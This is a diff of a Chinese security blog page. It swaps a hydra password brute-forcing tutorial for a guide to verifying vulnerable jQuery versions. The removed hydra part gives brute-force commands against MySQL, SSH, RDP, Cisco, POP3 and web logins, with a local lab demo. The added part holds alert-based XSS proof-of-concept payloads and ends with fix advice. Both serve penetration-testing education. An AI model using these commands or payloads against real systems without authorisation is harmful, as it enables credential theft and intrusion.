@@ -16,29 +16,31 @@
   <meta name="author" content="echozt">
   <meta name="keywords" content="网络安全，计算机，渗透">
   
-    <meta name="description" content="23年快结束了，发现好像今年还没有发过博客，忙忙碌碌，一年也快过去啦，以后还是要把我的博客捡起来咯">
+    <meta name="description" content="扫描网站使用的jquery库，是否为具有已知漏洞的版本。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于hydra的Windows使用">
-<meta property="og:url" content="https://echozt.github.io/posts/2a81.html">
+<meta property="og:title" content="验证已知漏洞的jquery库">
+<meta property="og:url" content="https://echozt.github.io/posts/5b49.html">
 <meta property="og:site_name" content="echozt">
-<meta property="og:description" content="23年快结束了，发现好像今年还没有发过博客，忙忙碌碌，一年也快过去啦，以后还是要把我的博客捡起来咯">
+<meta property="og:description" content="扫描网站使用的jquery库，是否为具有已知漏洞的版本。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://echozt.github.io/posts/2a81/1.png">
-<meta property="og:image" content="https://echozt.github.io/posts/2a81/2.png">
-<meta property="og:image" content="https://echozt.github.io/posts/2a81/3.png">
-<meta property="og:image" content="https://echozt.github.io/posts/2a81/4.png">
-<meta property="og:image" content="https://echozt.github.io/posts/2a81/5.png">
-<meta property="og:image" content="https://echozt.github.io/posts/2a81/6.png">
-<meta property="article:published_time" content="2023-12-13T01:47:42.000Z">
-<meta property="article:modified_time" content="2023-12-29T08:13:50.502Z">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/1.png">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/6.png">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/7.png">
+<meta property="og:image" content="https://echozt.github.io/posts/5b49/8.png">
+<meta property="article:published_time" content="2024-01-02T01:26:39.000Z">
+<meta property="article:modified_time" content="2024-01-02T03:34:13.187Z">
 <meta property="article:author" content="echozt">
-<meta property="article:tag" content="hydra">
-<meta property="article:tag" content="暴力破解">
+<meta property="article:tag" content="retire.js">
+<meta property="article:tag" content="jquery">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://echozt.github.io/posts/2a81/1.png">
+<meta name="twitter:image" content="https://echozt.github.io/posts/5b49/1.png">
   
   
-  <title>关于hydra的Windows使用 - echozt</title>
+  <title>验证已知漏洞的jquery库 - echozt</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -185,7 +187,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="关于hydra的Windows使用">
+            <span class="h2" id="subtitle" title="验证已知漏洞的jquery库">
               
             </span>
 
@@ -200,8 +202,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2023-12-13 09:47" pubdate>
-        2023年12月13日 上午
+      <time datetime="2024-01-02 09:26" pubdate>
+        2024年1月2日 上午
       </time>
     </span>
   
@@ -211,7 +213,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.5k 字
+      1.2k 字
     </span>
   
 
@@ -242,97 +244,51 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">关于hydra的Windows使用</h1>
+            <h1 style="display: none">验证已知漏洞的jquery库</h1>
             
             <div class="markdown-body">
-              <!--好像23年都没有发过文章了，今年都快结束啦，忙忙碌碌，还是把我的博客慢慢捡起来吧-->
-
-<!--好像23年都没有发过文章了，今年都快结束啦，忙忙碌碌，还是把我的博客慢慢捡起来吧-->
-
-<p>23年快结束了，发现好像今年还没有发过博客，忙忙碌碌，一年也快过去啦，以后还是要把我的博客捡起来咯<span id="more"></span></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>        对于页面登录框的暴力破解，一般使用BurpSuite就够了。但是对于数据库以及其他协议的密码破解，hydra无疑是个很棒的工具。</p>
-<p>        目前支持以下协议破解：</p>
-<blockquote>
-<p>AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</p>
-</blockquote>
-<p>        下载链接：</p>
-<p>Linux下载：<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
-<p>Windows下载：<a target="_blank" rel="noopener" href="https://github.com/maaaaz/thc-hydra-windows">https://github.com/maaaaz/thc-hydra-windows</a></p>
-<h1 id="1、hydra参数使用"><a href="#1、hydra参数使用" class="headerlink" title="1、hydra参数使用"></a>1、hydra参数使用</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>1<span class="token punctuation">)</span>使用单个的用户名或密码参数：
- -l 用户名
- -p 密码
-
-<span class="token punctuation">(</span>2<span class="token punctuation">)</span>使用字典的用户名或密码参数：
- -L 用户名字典
- -P 密码字典
- -C 指定所用格式为“user:password”的字典文件
-
-<span class="token punctuation">(</span>3<span class="token punctuation">)</span>其它常用参数：
- -v 显示爆破详细信息
- -V 每次尝试仅显示用户名密码
- -s 指定非默认端口
- -o 指定输出文件
- -M 指定多个ip目标列表文件（使用冒号“:”与端口分割，每行一条数据）
- -t 线程数（默认16）
- -f 单个主机找到一个用户名/密码之后，停止破解
- -F 所有主机找到一个用户名/密码之后，停止破解
- -e nsr 可选选项，n：表示尝试空密码，s：表示把用户名本身当做密码进行尝试，r：表示把用户名倒叙，当做密码进行尝试
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="2、MySQL密码破解"><a href="#2、MySQL密码破解" class="headerlink" title="2、MySQL密码破解"></a>2、MySQL密码破解</h1><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt ip mysql
-（如果发现MySQL不是在默认的3306端口，可以使用-s参数指定正确的端口号。
-这里注意这个-s要放在ip mysql前面，例如-s 3306 ip mysql）
-
-或者hydra -L user.txt -P pass.txt mysql://目标ip:mysql端口号 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>        其它数据库格式类似，这里我直接指定用户名为root，dic/dic_password_mysql.txt为我的密码字典相对路径。</p>
-<p> <img src="/posts/2a81/1.png" srcset="/img/loading.gif" lazyload class></p>
-<p>或者采用另一种格式：</p>
-<p> <img src="/posts/2a81/2.png" srcset="/img/loading.gif" lazyload class></p>
-<h1 id="3、破解web登录-GET方式"><a href="#3、破解web登录-GET方式" class="headerlink" title="3、破解web登录(GET方式)"></a>3、破解web登录(GET方式)</h1><pre class="line-numbers language-bash"><code class="language-bash">hydra -l 用户名 -p 密码字典 -t 线程 -v -e ns ip http-get /web/
-
-或者hydra -l 用户名 -p 密码字典 -t 线程 -v -e ns ip http-get /web/index.php
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h1 id="4、破解web登录（POST方式）"><a href="#4、破解web登录（POST方式）" class="headerlink" title="4、破解web登录（POST方式）"></a>4、破解web登录（POST方式）</h1><pre class="line-numbers language-bash"><code class="language-bash">hydra -l 用户名 -P 密码字典 域名/ip -s 端口 http-post-form <span class="token string">"/Pass-01/login.html?:username=^USER^&amp;password=^PASS^&amp;Login=Login:密码错误"</span> -v
-
-其中，在<span class="token string">"/Pass-01/login.html:username=^USER^&amp;password=^PASS^&amp;submit=Login:error"</span>中：
-（1）第一个冒号前面的“/Pass-09/login.html”为目标URL后带的路径。
-（2）第二个冒号前面的“username<span class="token operator">=</span>^USER^<span class="token operator">&amp;</span>password<span class="token operator">=</span>^PASS^<span class="token operator">&amp;</span>Login<span class="token operator">=</span>Login”为请求包中用户名和密码及提交的表单参数。
-（3）第二个冒号后面的“error”表示用户名密码错误时返回页面的信息，根据实际情况填写。
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这里用我的靶场示例一下：</p>
-<p>URL为：<a target="_blank" rel="noopener" href="http://127.0.0.1:8099/pikachu/vul/burteforce/bf_form.php">http://127.0.0.1:8099/pikachu/vul/burteforce/bf_form.php</a></p>
-<p>错误信息为：username or password is not exists～（这里只截取后面的not exist，刚开始试半天不成功，后来发现是这个错误语句的问题，可能是后面那个特殊符号的问题吧）</p>
-<p> <img src="/posts/2a81/3.png" srcset="/img/loading.gif" lazyload class></p>
-<p>表单内容为：username=test&amp;password=222&amp;submit=Login</p>
-<p> <img src="/posts/2a81/4.png" srcset="/img/loading.gif" lazyload class></p>
-<p>所以构造语句：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">hydra -L dic/username.txt -P dic/password.txt -f -s 8099 127.0.0.1 http-post-form <span class="token string">"/pikachu/vul/burteforce/bf_form.php:username=^USER^&amp;password=^PASS^&amp;submit=Login:not exists"</span>
+              <p>扫描网站使用的jquery库，是否为具有已知漏洞的版本。<span id="more"></span></p>
+<h1 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>        在 jquery 的诸多发行版本中，存在着 DOM型XSS 漏洞，易被攻击者利用。</p>
+<h2 id="1-2-漏洞成因"><a href="#1-2-漏洞成因" class="headerlink" title="1.2 漏洞成因"></a>1.2 漏洞成因</h2><p>        漏洞原因在于过滤用户输入数据所使用的正则表达式存在缺陷，可能导致 LOCATION.HASH 跨站漏洞。</p>
+<h1 id="2、扫描插件——retire-js"><a href="#2、扫描插件——retire-js" class="headerlink" title="2、扫描插件——retire.js"></a>2、扫描插件——retire.js</h1><p>        这里强烈推荐我觉得很好用的一个插件：retire.js。我一般是作为火狐的插件使用，这样在浏览网页时会自动检测到jquery的版本信息。</p>
+<p> <img src="/posts/5b49/1.png" srcset="/img/loading.gif" lazyload class></p>
+<p>        会显示jquery的版本以及对应的jquery的网址，以及可能存在哪些CVE的漏洞。</p>
+<p> <img src="/posts/5b49/2.png" srcset="/img/loading.gif" lazyload class></p>
+<h1 id="3、验收jquery历史漏洞版本环境"><a href="#3、验收jquery历史漏洞版本环境" class="headerlink" title="3、验收jquery历史漏洞版本环境"></a>3、验收jquery历史漏洞版本环境</h1><p>版本漏洞检测网站：<a target="_blank" rel="noopener" href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a>  </p>
+<p>jQuery 版本漏洞验证网站：<a target="_blank" rel="noopener" href="https://jsbin.com/?html,js,output">https://jsbin.com/?html,js,output</a></p>
+<h2 id="3-1-CVE-2020-11022、CVE-2020-11023"><a href="#3-1-CVE-2020-11022、CVE-2020-11023" class="headerlink" title="3.1 CVE-2020-11022、CVE-2020-11023"></a>3.1 CVE-2020-11022、CVE-2020-11023</h2><pre class="line-numbers language-bash"><code class="language-bash">在线验证网站：https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>这里使用-f参数，当成功获取到一组用户名密码时，就停止爆破。得到结果：admin/123456</p>
-<p> <img src="/posts/2a81/5.png" srcset="/img/loading.gif" lazyload class></p>
-<p>登录成功，获取正确。</p>
-<p> <img src="/posts/2a81/6.png" srcset="/img/loading.gif" lazyload class></p>
-<h1 id="5、破解其它协议"><a href="#5、破解其它协议" class="headerlink" title="5、破解其它协议"></a>5、破解其它协议</h1><pre class="line-numbers language-bash"><code class="language-bash">这里任意写几个，格式类型都跟前面破解MySQL类似。
-
-（1）破解rdp（远程桌面密码）
-hydra -l administer -P pass.txt ip rdp
-
-（2）破解ssh
-hydra -L user.txt -P pass.txt ip <span class="token function">ssh</span>
-
-<span class="token punctuation">(</span>3<span class="token punctuation">)</span>破解https
-hydra -m /index.php -L user.txt -P pass.txt ip https
-
-<span class="token punctuation">(</span>4<span class="token punctuation">)</span>破解cisco
-hydra -P pass.txt IP cisco
-hydra -m cloud -P pass.txt ip cisco-enable
-
-<span class="token punctuation">(</span>5<span class="token punctuation">)</span>破解pop3
-hydra -L user.txt -P pass.txt my.pop3.mail pop3
-
-<span class="token punctuation">(</span>6<span class="token punctuation">)</span>破解talent
-hydra -L user.txt -P pass.txt ip talent
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用方式：</p>
+<p>（1）将网址中head头部中的script标签的src内容替换为待验证的jquery网址。</p>
+<p> <img src="/posts/5b49/3.png" srcset="/img/loading.gif" lazyload class></p>
+<p>（2）然后尝试点击三个poc的任意一个Append via .html()按钮，存在漏洞则会出现弹窗。</p>
+<p> <img src="/posts/5b49/4.png" srcset="/img/loading.gif" lazyload class></p>
+<h2 id="3-2-CVE-2012-6708"><a href="#3-2-CVE-2012-6708" class="headerlink" title="3.2 CVE-2012-6708"></a>3.2 CVE-2012-6708</h2><pre class="line-numbers language-bash"><code class="language-bash">在Console窗口输入：
+<span class="token punctuation">$(</span><span class="token string">"element[attribute='&lt;img src=123 οnerrοr=alert(123)>'"</span><span class="token punctuation">)</span>
+若存在漏洞，则会出现弹窗。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="3-3-CVE-2011-4969"><a href="#3-3-CVE-2011-4969" class="headerlink" title="3.3 CVE-2011-4969"></a>3.3 CVE-2011-4969</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">$(</span><span class="token string">"#&lt;img src=x onerror=alert(111)>"</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="3-4-CVE-2012-6708、CVE-2011-4969、CVE-2015-9251"><a href="#3-4-CVE-2012-6708、CVE-2011-4969、CVE-2015-9251" class="headerlink" title="3.4 CVE-2012-6708、CVE-2011-4969、CVE-2015-9251"></a>3.4 CVE-2012-6708、CVE-2011-4969、CVE-2015-9251</h2><pre class="line-numbers language-bash"><code class="language-bash">jQuery-with-XSS-master：https://github.com/mahp/jQuery-with-XSS
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以验证这三个漏洞：</p>
+<p> <img src="/posts/5b49/5.png" srcset="/img/loading.gif" lazyload class></p>
+<p>使用方式：</p>
+<p>（1）下载好这个验证poc之后，可编辑test.html的第九行代码，将代码中的src后的链接改为自己要验证的js地址链接。</p>
+<p> <img src="/posts/5b49/6.png" srcset="/img/loading.gif" lazyload class></p>
+<p>（2）保存之后，用浏览器打开可以看到三个demo，依次点击，若出现弹窗则证明被验证成功。</p>
+<p> <img src="/posts/5b49/7.png" srcset="/img/loading.gif" lazyload class></p>
+<p>（3）页面中的test version（测试版本）链接中，可查看对应 jQuery 版本存在的 bug 编号。</p>
+<p> <img src="/posts/5b49/8.png" srcset="/img/loading.gif" lazyload class></p>
+<h1 id="4、修复建议"><a href="#4、修复建议" class="headerlink" title="4、修复建议"></a>4、修复建议</h1><ul>
+<li><p>暂时隐藏 jQuery 版本信息，避免被攻击者识别出版本号。  </p>
+</li>
+<li><p>建议将 jQuery 版本升级至 1.9.x 或以上版本 3.4.0，升级 jquery-ui 版本到 1.12.0 以上。不过升级有风险，因为版本兼容的问题，jQuery 官方推荐了 jQuery Migrate 库来解决 jQuery 升级问题。  </p>
+</li>
+<li><p>过滤用户输入的内容、严格控制输出等。</p>
+</li>
+</ul>
+<p> </p>
 
             </div>
             <hr>
@@ -350,9 +306,9 @@ hydra -L user.txt -P pass.txt ip talent
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/hydra/">hydra</a>
+                      <a class="hover-with-bg" href="/tags/retire-js/">retire.js</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">暴力破解</a>
+                      <a class="hover-with-bg" href="/tags/jquery/">jquery</a>
                     
                   </div>
                 
@@ -369,18 +325,12 @@ hydra -L user.txt -P pass.txt ip talent
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/5b49.html">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">验证已知漏洞的jquery库</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/2f6a.html">
-                        <span class="hidden-mobile">记一次惨痛教训</span>
+                      <a href="/posts/2a81.html">
+                        <span class="hidden-mobile">关于hydra的Windows使用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
